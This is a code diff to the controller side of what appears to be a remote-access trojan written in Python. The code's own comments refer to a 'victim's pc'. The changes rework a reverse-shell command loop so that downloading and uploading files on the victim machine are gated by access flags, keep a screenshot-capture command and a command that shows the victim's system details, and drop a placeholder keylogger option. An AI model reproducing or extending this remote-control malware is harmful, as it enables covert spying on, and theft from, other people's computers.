@@ -166,14 +166,14 @@ def selection(menu, choice):  # Switch case, to dispatch menu possibilities.
             logging.info("Entering to the reverse shell")
             time.sleep(1)
             consoleCleaner(False)
-            reverseShell(False, False)
+            reverseShell(False, False, False)
             return True
         elif choice == "4":
             print("Let's go deeper !")
             logging.info("Entering to the expert mode")
             time.sleep(1)
             consoleCleaner(False)
-            reverseShell(True, True)
+            reverseShell(True, True, True)
             return True
         elif choice == "5":
             print("Let's upload some files !")
@@ -219,7 +219,7 @@ def selection(menu, choice):  # Switch case, to dispatch menu possibilities.
 
 
 # If chosen, open a shell that interact with victim's pc.
-def reverseShell(screenThatbeachAcces, keyLogger):
+def reverseShell(screenThatbeachAcces, upload, download):
     global defaultPath
     encrypter.send_message_server("cd " + defaultPath)
     encrypter.receive_message_server()
@@ -232,13 +232,17 @@ def reverseShell(screenThatbeachAcces, keyLogger):
         elif((command == "stb") & (screenThatbeachAcces == True)):
             print("taking the screenshot")
             screenThatbeach()
-        elif("dl" in command):
+        elif(("dl" in command) & (download == False)):
+            print("Acces forbidden")
+        elif(("dl" in command) & (download == True)):
             try:
                 command_split = command.split()
                 downloadFile(command_split[1])
             except:
                 print("No file name !")
-        elif("upload" in command):
+        elif(("upload" in command) & (upload == False)):
+            print("Acces forbidden")
+        elif(("upload" in command) & (upload == True)):
             currentDirectory = os.getcwd()
             try:
                 command_split = command.split()
@@ -259,11 +263,6 @@ def reverseShell(screenThatbeachAcces, keyLogger):
                     uploadFile(currentDirectory, command_split[1])
             except:
                 print("No file name !")
-        elif((command == "keylogger") & (keyLogger == False)):
-            print("Acces forbidden")
-        elif((command == "keylogger") & (keyLogger == True)):
-            print("Not available now !")
-            # client_socket.send(command.encode("utf-8"))
         elif(command == "state"):
             print(OsVictimInfos)
         elif(command == "home"):
